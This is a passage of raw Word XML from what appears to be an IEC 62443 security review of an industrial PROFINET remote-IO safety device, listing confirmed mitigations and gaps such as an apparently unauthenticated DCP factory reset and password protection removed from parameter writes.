        <w:t xml:space="preserve">STRIDE — Tampering + Spoofing + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> correct and complete.</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Refinement: anchor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to (a) </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>switch=999 → firmware-update</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (received from RQ-005) and (b) </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated DCP reset</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (an unauthenticated action with a privileged effect). No change needed beyond these anchors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C0A354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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E467FCB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>Mitigations confirmed (incl. the ones received from RQ-005):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029"/>
        <w:gridCol w:w="4288"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="5A7C5A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A16404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86BC0E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Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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E92D52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Confirmed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="29BAB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BB9A6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Password protection for parameter writes explicitly dropped</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; IoT-Core read-only instead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DFE94" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SRIO-8299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C558C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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Pivotal design decision.</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId273" w:history="1">
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00483B71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D73D4E" w:rsidRPr="00D73D4E" w14:paraId="33F51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5C2FB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IoT-Core incoming-only, no parameter writes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60D20" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SRIO-7908, SRIO-2100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23480" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId274" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="250511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FF0AF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Parameter writes only via fieldbus/PLC engineering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15A1E" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SRIO-1983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B03FE" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId275" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="1A5A2C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F4A1C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 xml:space="preserve">F-address/update-mode </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>change needs physical switch + power-cycle</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (received from RQ-005)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AE70A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:lastRenderedPageBreak/>
              <w:t>SRIO-2013, SRIO-</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:lastRenderedPageBreak/>
              <w:t>8803, SRIO-10812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E66CA" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Physical-presence authorization </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">barrier (for these two actions only). </w:t>
            </w:r>
            <w:hyperlink r:id="rId276" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId277" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="3EDBE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616CE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lastRenderedPageBreak/>
              <w:t>FW update accepted only in Update state</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (received from RQ-005)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596D5" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SRIO-11534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8337C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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Authorization gate on updates. </w:t>
            </w:r>
            <w:hyperlink r:id="rId278" w:history="1">
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00483B71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D73D4E" w:rsidRPr="00483B71" w14:paraId="2ABC6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6CECE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Config write blocked after param-end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8811D" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SRIO-7749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E0BED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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Temporal authorization control. </w:t>
            </w:r>
            <w:hyperlink r:id="rId279" w:history="1">
              <w:r w:rsidRPr="00483B71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483B71">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00483B71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</w:tbl>
    <w:p w14:paraId="19C17848" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E301F26" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (delegated authorization — accurate, elevate).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Password protection was </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deliberately removed</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-8299), so authorization for safety-parameter writes over the fieldbus is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fully delegated to the environment</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (locked cabinet SRIO-9402, restricted network) — a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CCSC-2 compensating control</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>documented</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> but </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not device-enforced</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. CR 1.1/1.2/2.1 are </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>met only at the system level, not the component level</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId280" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId281" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0727C91A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (DCP factory-reset — your best finding; corroborated).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> DCP "Reset to Factory" (Mode 2 mandatory) resets communication parameters; SRIO-7772/3030 describe </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>modes</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authentication</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corroborating evidence: SRIO-3029</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> —</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"A PROFINET IO-Controller or an Engineering System can change IP parameters or the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NameOfStation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the device </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>at any time</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — implying </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no per-action authentication</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Your "must verify by test" caveat is retained; TS-2 settles it. Impact is bounded: DCP reset hits </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>communication</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters (→ passivation/safe state), not silent safety-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iPar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> modification. </w:t>
      </w:r>
      <w:hyperlink r:id="rId282" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C5AAB30" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (IoT read-only — confirmation, not a gap).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TS confirms the write-path is blocked. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">Positive </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>control</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>verification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId283" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5D660184" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
